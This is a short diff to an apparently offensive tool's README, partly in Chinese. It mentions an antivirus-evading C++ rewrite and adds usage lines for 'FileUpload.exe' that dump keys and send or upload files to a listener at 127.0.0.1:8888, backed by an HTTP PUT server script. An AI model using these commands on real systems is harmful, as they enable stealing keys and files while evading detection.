@@ -68,7 +68,11 @@ void getFileNames(string path, vector<string>& files)
 远程拉取基址，考虑到免杀性改成了C++代码，
 ![](https://cdn.nlark.com/yuque/0/2022/png/262397/1665469015290-f07178fb-95a6-4d35-9161-bbf2d4a7da13.png)
 
-
+```
+[+] FileUpload.exe dumpkey
+[+] FileUpload.exe send 127.0.0.1 8888
+[+] FileUpload.exe upload path 127.0.0.1 8888
+```
 
 ### v1.1
 服务端：python2 http_put.py 80 path 
